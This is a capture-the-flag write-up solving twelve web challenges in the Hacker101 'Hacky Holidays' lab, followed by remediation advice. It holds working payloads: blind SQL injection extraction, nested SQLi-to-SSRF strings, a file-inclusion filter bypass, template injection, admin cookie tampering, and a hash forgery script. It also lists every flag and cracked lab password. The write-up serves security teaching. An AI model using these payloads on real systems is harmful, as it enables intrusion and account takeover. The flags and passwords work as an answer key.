# Hackyholidays CTF: Writeup (12/12 flags)

**Date:** 2026-10-10  
**Instance:** `https://d4074498fb66352fbbfe300c67ce1312.ctf.hacker101.com`  
**Difficulty:** Moderate  
**Flags:** 12/12

---

## Challenge Overview

**Context:** A Christmas-themed CTF (Hacky Holidays) with 12 independent mini-challenges in a single application. Each flag corresponds to a different subsystem: from basic recon to SSTI, blind SQLi, integer overflow, and chained SSRF.

**What you face:** 12 distinct endpoints with completely different vulnerabilities. There is no single thread. The challenge tests technical breadth: LFI, IDOR, cookie tampering, hash cracking, blind SQLi, integer overflow, and nested SSRF via SQLi.

**Vulnerabilities exploited:**
- Information Disclosure (CWE-200): flag in `robots.txt` and HTML comment
- IDOR (CWE-639): base64 JSON IDs in `/people-rater`
- Broken Authentication (CWE-287): JSON cookie with `admin:false` field modifiable by the client
- LFI (CWE-22) with sanitization bypass: `str_replace` circumvented via nesting in `/my-diary`
- SSTI: template injection via `{{name}}` field that processes `{{template:...}}` in `/hate-mail-generator`
- Blind SQL Injection (CWE-89): side-channel extraction in `/evil-quiz` via "There is X other"
- Integer Overflow via PHP `intval('1e3')` (CWE-190): promoted to admin in `/signup-manager`
- Nested SSRF via SQLi (CWE-918): SQLi on album hash triggers internal SSRF in `/r3c0n_server`
- Hash Length Extension / MD5 forge: known salt allows hash forging in `/attack-box`

**What you learn:**
- A single domain can concentrate vulnerabilities from 9 different classes
- Blind SQLi via side-channel (record count) is powerful even without a direct response
- `intval()` in PHP has non-obvious behavior with scientific notation
- SSRF can be chained inside SQLi results to reach internal endpoints
- Authentication cookies in unsigned base64-encoded JSON are trivially tampered with

---

## Flag 1: robots.txt

```
GET /robots.txt
```
Flag exposed directly in the robots.txt file.

---

## Flag 2: /s3cr3t-ar3a

```
GET /s3cr3t-ar3a
# Inspect HTML: comment contains the flag
```

---

## Flag 3: /people-rater (IDOR)

IDs are base64-encoded JSON: `{"id":1}` → `eyJpZCI6MX0=`

```
GET /people-rater/entry/?id=eyJpZCI6MX0=
```

Flag appears for id=1.

---

## Flag 4: /swag-shop (API sessions)

```
GET /swag-shop/api/sessions
# Returns the Grinch's UUID
GET /swag-shop/api/user?uuid=<UUID>
# Returns personal data with the flag
```

---

## Flag 5: /secure-login (cookie admin tampering + zip crack)

1. `POST /secure-login/` with credentials → returns base64-encoded JSON cookie `{"cookie":"...","admin":false}`
2. Modify `admin:true`, re-encode, set cookie
3. Access `/secure-login/` with modified cookie → link to zip
4. Crack zip (password: `hahahaha`)
5. Flag inside the zip

---

## Flag 6: /my-diary (LFI with str_replace bypass)

The server uses `str_replace('admin', '', $template)`. Bypass via nesting:
```
GET /my-diary/?template=secretadsecretaadmin.phpdmin.phpmin.php
# → after str_replace: secretadmin.php
```

---

## Flag 7: /hate-mail-generator (SSTI)

```http
POST /hate-mail-generator/new/preview/
preview_markup={{name}}
preview_data={"name":"{{template:38dhs_admins_only_header.html}}","email":"alice@test.com"}
```

`{{template:...}}` is processed inside `{{name}}`, including a private template.

---

## Flag 8: /forum (credentials hash)

1. Crack the Grinch's hash on `/forum/` → password: `BahHumbug`
2. Login: `grinch:BahHumbug`
3. `GET /forum/3/2/` → secret post with the flag

---

## Flag 9: /evil-quiz (Blind SQLi)

**Flow:**
1. `GET /evil-quiz/` → receives `quizsession` cookie
2. `POST /evil-quiz/` with `name=<SQLi payload>`
3. `POST /evil-quiz/start/` with answers → returns score with "There is X other player(s)"

**Detection:** "There is 1 other" = SQLi match

**Password extraction:**
```python
payload = "x' union select 1,2,3,4 from admin where username='admin' and ord(substr(password,%d,1))=%d-- -" % (index, ord(letter))
```

**Admin password:** `S3creT_p4ssw0rd-$`

**Login:** `POST /evil-quiz/admin/` with `username=admin&password=S3creT_p4ssw0rd-$`

**Flag:** `6c3e9e0f9e9bba291f9c909734584d7643cb34ad5fa099a6c272cffed51ac327`

---

## Flag 10: /signup-manager (age overflow → admin bit)

**Vulnerability:** `intval('1e3')` in PHP returns `1000` (4 chars), shifting the user line beyond 113 bytes, causing the last `Y` in lastname to occupy the admin bit.

**Exploit:**
```python
requests.post(url + '/', data={
    'action': 'signup',
    'username': 'anyuser',
    'password': 'anypass',
    'age': '1e3',            # overflow: PHP intval('1e3') = 1000 (4 chars)
    'firstname': 'Test',
    'lastname': 'YYYYYYYYYYYYYYY'  # 15 Y's: last Y becomes the admin bit
})
```

**Flag:** `00cc4b68c4008b4375a0a104a3a1e942e725f92533a0c18a466ec08d78e4a7ec`

---

## Flag 11: /r3c0n_server_4fdk59 (nested SQLi + SSRF)

**Step 1: SQLi on album hash with 3 columns**
```
GET /r3c0n_server_4fdk59/album?hash=-1' union select 1,2,3 -- -
```

**Step 2: Nested SSRF via SQLi**
```
hash=asdasd' UNION SELECT "4' UNION SELECT 1,1,\"../api/user?username=g%\";/*",1,1;/*
```

**Detection:** picture returns "Invalid content type detected" (match) vs "Expected HTTP status 200, Received: 204" (no match)

**Step 3: Enumerate username** → `grinchadmin`

**Step 4: Enumerate password** → `s4nt4sucks`

**Step 5: Login** → `POST /attack-box/login/` with `grinchadmin:s4nt4sucks`

**Flag:** `60c9dacc638a9933c296a1e220de259c92ddd1d3a50faf799d091c2591174a0a` (on the attack box page)

---

## Flag 12: /attack-box (DDoS hash bypass)

**Analysis of existing payload:**
```json
{"target":"203.0.113.33","hash":"5f2940d65ca4140cc18d0878bc398955"}
```

**Verification:** `md5("mrgrinch463" + "203.0.113.33") = 5f2940d65ca4140cc18d0878bc398955` ✓

**Salt:** `mrgrinch463`

**Forge hash for 0.0.0.0:**
```python
import hashlib, base64, json
h = hashlib.md5(("mrgrinch463" + "0.0.0.0").encode()).hexdigest()
# h = "5b8a6a26a232903d9ff1268bfc85b057"
payload = json.dumps({"target":"0.0.0.0","hash":h}, separators=(',',':'))
payload_b64 = base64.b64encode(payload.encode()).decode()
```

**Attack:**
```
GET /attack-box/launch/?payload=<base64>
# Monitor: GET /attack-box/launch/{file_id}.json?id=0
# When goto appears: GET /attack-box/challenge-completed-{id}/
```

**Flag:** `cf129f5b0b04a421b7c9b4e3ec415b71254998f806823f9266c032e20ad6692a`

---

## Credentials Summary

| App | Username | Password |
|-----|----------|----------|
| evil-quiz | admin | S3creT_p4ssw0rd-$ |
| attack-box | grinchadmin | s4nt4sucks |
| secure-login zip |: | hahahaha |
| forum | grinch | BahHumbug |

---

## MITRE ATT&CK Mapping

| Tactic | Technique | ID | Description |
|---|---|---|---|
| Initial Access | Exploit Public-Facing Application | T1190 | SQLi, SSTI, LFI, SSRF across multiple endpoints |
| Credential Access | Brute Force: Password Cracking | T1110.002 | Cracking Grinch's hash on `/forum` (password: `BahHumbug`) |
| Credential Access | Unsecured Credentials: Credentials in Files | T1552.001 | Flags in `robots.txt` and HTML comments |
| Persistence | Account Manipulation | T1098 | Cookie tampering to set `admin:true` in `/secure-login` |
| Execution | Command and Scripting Interpreter | T1059 | SSTI via `{{template:...}}` in `/hate-mail-generator` |
| Discovery | File and Directory Discovery | T1083 | LFI with `str_replace` bypass in `/my-diary` |
| Collection | Data from Information Repositories | T1213 | Blind SQLi side-channel extraction in `/evil-quiz` |
| Lateral Movement | Exploitation of Remote Services | T1210 | Nested SSRF via SQLi in `/r3c0n_server` to reach internal API |

---

## Remediation

### Technical Fixes

1. **Parameterize all SQL queries** to eliminate blind SQLi (evil-quiz, r3c0n_server)
2. **Sign and encrypt session cookies** with HMAC; never trust client-side JSON with `admin` flags
3. **Use allowlists for template parameters**; disable dynamic template inclusion (hate-mail-generator)
4. **Canonicalize file paths** and use allowlists for LFI prevention; `str_replace` is insufficient
5. **Use `intval()` with strict type checking** or cast to `(int)` to prevent scientific notation overflow
6. **Restrict SSRF** with URL allowlists and disable internal network access from user-controlled inputs
7. **Use bcrypt/argon2** for password hashing; enforce strong password policies
8. **Remove sensitive data** from `robots.txt` and HTML comments

### OWASP Top 10 2021

| ID | Risk | Relevance |
|---|---|---|
| A01 | Broken Access Control | IDOR in `/people-rater`, admin cookie tampering, LFI bypass in `/my-diary` |
| A03 | Injection | Blind SQLi (`/evil-quiz`), SSTI (`/hate-mail-generator`), nested SQLi+SSRF (`/r3c0n_server`) |
| A05 | Security Misconfiguration | `robots.txt` flag disclosure, HTML comments, `intval()` integer overflow |
| A07 | Identification and Authentication Failures | Unsigned JSON cookies, default credentials, weak password hashes |

### D3FEND Countermeasures

| ID | Technique | Application |
|---|---|---|
| D3-IPCF | IPC Filtering | Parameterize SQL queries; restrict template inputs with allowlists |
| D3-SPP | Strong Password Policy | Enforce password complexity; use bcrypt/argon2 for hashing |
| D3-SCA | Session Cookie Attribute | Sign and encrypt cookies; set HttpOnly, Secure, SameSite |
| D3-CSPP | Client-Side Parameter Pollution Prevention | Validate base64 JSON IDs server-side (IDOR prevention) |

### NIST CSF 2.0

| Function | Category | Subcategory | Application |
|---|---|---|---|
| Protect | PR.DS | PR.DS-01 | Validate and sanitize all inputs server-side |
| Protect | PR.AA | PR.AA-01 | Sign authentication cookies; enforce MFA on admin endpoints |
| Detect | DE.CM | DE.CM-01 | Monitor for blind SQLi patterns, cookie manipulation, SSRF payloads |
| Respond | RS.AN | RS.AN-03 | Alert on anomalous record count changes (blind SQLi side-channel) |

### NIST SP 800-53 Rev. 5

| Control | Title | Application |
|---|---|---|
| SI-10 | Information Input Validation | Validate all inputs; use allowlists for template parameters and file paths |
| AC-3 | Access Enforcement | Server-side authorization; sign session tokens; enforce RBAC |
| IA-5 | Authenticator Management | bcrypt/argon2 for hashing; no default credentials in production |
| SC-28 | Protection of Information at Rest | Never store sensitive data in `robots.txt` or HTML comments |

---

## Final Thoughts

Twelve flags, nine vulnerability classes, one Christmas theme. Hacky Holidays is a masterclass in breadth: from basic recon (`robots.txt`) to chained nested SSRF via SQLi, with IDOR, cookie tampering, blind SQLi, SSTI, LFI, integer overflow, and hash cracking in between. The `intval('1e3')` trick alone is worth remembering for every PHP audit you do. And the nested SSRF inside SQLi results? That is the kind of chain that shows up in real-world pentests more often than you'd expect.

Thanks guys!! (❍ᴥ❍ʋ)

Twelve flags down, countless more to go. If this marathon gave you new tools for your next engagement, share the holiday cheer:

- Instagram: https://www.instagram.com/uniaogeek
- LinkedIn: http://linkedin.com/in/mrhenrike
- X: https://x.com/mrhenrike
